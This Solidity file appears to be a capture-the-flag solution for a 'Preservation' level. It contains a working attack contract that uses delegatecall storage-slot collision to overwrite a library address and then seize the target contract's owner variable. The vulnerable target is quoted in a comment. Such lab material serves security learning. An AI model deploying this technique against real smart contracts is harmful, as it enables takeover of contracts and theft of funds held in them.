// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IPreservation {
    function owner() external view returns (address);
    function setFirstTime(uint256) external;
}

contract PreservationHack {
    // Align storage layout same as Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function attack(IPreservation target) external {

        // set address of timeZone1Library to this PreservationHack contract. 
        target.setFirstTime(uint256(uint160(address(this))));

        // call setFirstTime again to call `setTime` inside PreservationHack contract.
        // Set owner to msg.sender instead of the PreservationHack contract.
        target.setFirstTime(uint256(uint160(msg.sender)));

        // Revert unless the owner is the player (msg.sender)
        require(target.owner() == msg.sender, "hack failed");
    }

    // This function executes on 2nd call of setFirstTime, updating the owner state variable.
    function setTime(uint256 _ownerAddress) public {
        // Casting owner input from uint into an address like such:
        owner = address(uint160(_ownerAddress));
    }
}

/*
// Target Contract
contract Preservation {

  // public library contracts 
  address public timeZone1Library;
  address public timeZone2Library;
  address public owner; 
  uint storedTime;
  // Sets the function signature for delegatecall
  bytes4 constant setTimeSignature = bytes4(keccak256("setTime(uint256)"));

  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) {
    timeZone1Library = _timeZone1LibraryAddress; 
    timeZone2Library = _timeZone2LibraryAddress; 
    owner = msg.sender;
  }
 
  // set the time for timezone 1
  function setFirstTime(uint _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }

  // set the time for timezone 2
  function setSecondTime(uint _timeStamp) public {
    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
  }
}

// Simple library contract to set the time
contract LibraryContract {

  // stores a timestamp 
  uint storedTime;  

  function setTime(uint _time) public {
    storedTime = _time;
  }
}
*/